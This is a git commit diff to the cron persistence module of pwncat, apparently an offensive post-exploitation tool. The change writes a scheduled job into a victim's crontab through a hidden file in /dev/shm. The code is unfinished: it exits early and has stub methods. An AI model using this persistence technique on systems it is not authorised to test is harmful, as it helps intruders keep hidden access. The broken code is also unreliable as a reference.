258f8b3e2dff66b57061b9cd6401e92161a78959
montysecurity <jacobcainmontgomery@gmail.com>
2020-10-16 21:18:32 -0500

    Write and remove Proof of Concept, with files

--- pwncat/modules/persist/cron.py
+++ pwncat/modules/persist/cron.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import pwncat, random
+import pwncat, random, os
 from crontab import CronTab
 from pwncat.modules import Argument, Status, PersistType, PersistError
 from pwncat.modules.persist import PersistModule
@@ -25,20 +25,32 @@ class Module(PersistModule):
     PLATFORM = pwncat.platform.Platform.LINUX
 
     def install(self, user, lhost, lport, schedule, shell):
+        # Interesting note: was tested on a raspberry pi (gen 3) and failed every time. No error was raised. No matter what "pwncat.victim.run" was populated with, it would not execute
         if shell == "current":
             shell = pwncat.victim.shell  
         
         try:
-            randint = random.randint(1024, 65535)
+            user_entries = pwncat.victim.env(["crontab", "-l"]).decode("utf-8") #stolen from enum/cron.py module, thanks :)
+            randint = str(random.randint(1024, 65535)).strip()
             cron = CronTab(user=True)
-            job = cron.new(command='echo ' + str(randint))
+            job = cron.new(command='echo ' + randint)
             job.minute.every(1)
-            cron.write()
+            with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
+                flip.write(f"{job}\n")
+            pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
         except (PermissionError) as exc:
             raise PersistError(str(exc))
         
-        cron.remove(job)
-        cron.write()
+        with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
+            flip.write(f"{user_entries}")
+        pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
+
+
+        #pwncat.victim.run([cron.remove(job)])
+        #pwncat.victim.run([cron.write()])
+        #pwncat.victim.run([f"crontab -l"], wait=True)
+        #pwncat.victim.env(["crontab", "-l"]).decode("utf-8")
+        exit()
         
         if schedule != "" and lhost != "" and lport != "":
             cron = CronTab(user=True)
@@ -48,16 +60,30 @@ class Module(PersistModule):
             for number in schedule.split():
                 if number != str("*"):
                     if c == 0:
-                        job.minute.every(schedule.split()[0]) # 0-59
+                        pwncat.victim.run([job.minute.every(schedule.split()[0])]) # 0-59
                     if c == 1:
-                        job.hour.every(schedule.split()[1]) # 0-23
+                        pwncat.victim.run([job.hour.every(schedule.split()[1])]) # 0-23
                     if c == 2:
-                        job.day.on(schedule.split()[2]) # 1-31
+                        pwncat.victim.run([job.day.on(schedule.split()[2])]) # 1-31
                     if c == 3:
-                        job.month.on(schedule.split()[3]) # 1-12
+                        pwncat.victim.run([job.month.on(schedule.split()[3])]) # 1-12
                     if c == 4:
-                        job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
+                        pwncat.victim.run([job.dow.on(schedule.split()[4])]) # 0-6 (0 = Sunday)
                     c += 1
                     # if number = * then do not set, the crontab module assumes that as default
-            cron.write()
-            yield Status("Installed the following cron: " + str(schedule) + str(payload))
+            #pwncat.victim.run([cron.write()])
+            pwncat.victim.run(["echo", job, "|", "crontab"])
+
+    def remove(self, user, lhost, lport, schedule, shell):
+        """ Remove any modifications from the remote victim """
+
+        yield Status("You can also update the progress bar here")
+
+    def escalate(self, user, lhost, lport, schedule, shell):
+        """ Locally escalate privileges with this module """
+
+        yield Status("Update the status information")
+        return "exit command used to leave this new shell"
+
+    def connect(self, user, lhost, lport, schedule, shell):
+        """ Connect to the victim at pwncat.victim.host.ip """
